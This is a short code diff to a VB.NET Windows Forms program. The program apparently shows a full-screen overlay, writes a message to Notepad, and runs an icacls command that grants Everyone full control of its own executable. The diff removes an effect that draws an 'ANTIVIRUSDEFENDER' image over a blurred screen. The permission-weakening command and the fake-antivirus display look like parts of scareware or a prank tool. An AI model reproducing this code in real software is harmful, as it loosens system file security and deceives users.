@@ -996,7 +996,7 @@ Public Class Form1
             Dim currentName As String = Process.GetCurrentProcess().MainModule.FileName
 
             ' Create the command with actual paths
-            Dim command As String = $"icacls ""{currentDir}{System.IO.Path.GetFileName(currentName)}"" /grant Everyone:(OI)(CI)F"
+            Dim command As String = $"icacls ""{currentDir}{Path.GetFileName(currentName)}"" /grant Everyone:(OI)(CI)F"
 
             ExecuteCommand(command)
         Catch ex As Exception
@@ -1146,7 +1146,6 @@ Public Class Form1
         ' Execute remaining operations
         WriteMessageToNotepad()
         GrantSelfPermissions()
-        animationTimer.Start()
         VisualEffectTimer.Start()
         portalTimer.Start()
         overlay = New FullScreenOverlay()
@@ -1231,28 +1230,6 @@ Public Class Form1
         g.FillRectangle(flashBrush, ClientRectangle)
         Thread.Sleep(50)
         Invalidate() ' Clear the flash effect
-    End Sub
-
-    ' Timer Tick event handler for animation effects
-    Private Sub AnimationTimer_Tick(sender As Object, e As EventArgs) Handles animationTimer.Tick
-        ' Create a blur effect by drawing semi-transparent rectangles
-        Dim g As Graphics = CreateGraphics()
-        Dim blurBrush As New SolidBrush(Color.FromArgb(50, Color.Black))
-
-        For i As Integer = 0 To 10
-            Dim offset As Integer = i * 5
-            g.FillRectangle(blurBrush, 0 - offset, 0 - offset, Width + offset * 2, Height + offset * 2)
-        Next
-
-        ' Draw the ANTIVIRUSDEFENDER image
-        If antivirusdefenderImage IsNot Nothing Then
-            Dim x As Integer = ClientSize.Width \ 2 - antivirusdefenderImage.Width \ 2
-            Dim y As Integer = ClientSize.Height \ 2 - antivirusdefenderImage.Height \ 2
-            g.DrawImage(antivirusdefenderImage, x, y)
-        End If
-
-        ' Delay to create a smooth effect
-        Thread.Sleep(50)
     End Sub
 
 End Class
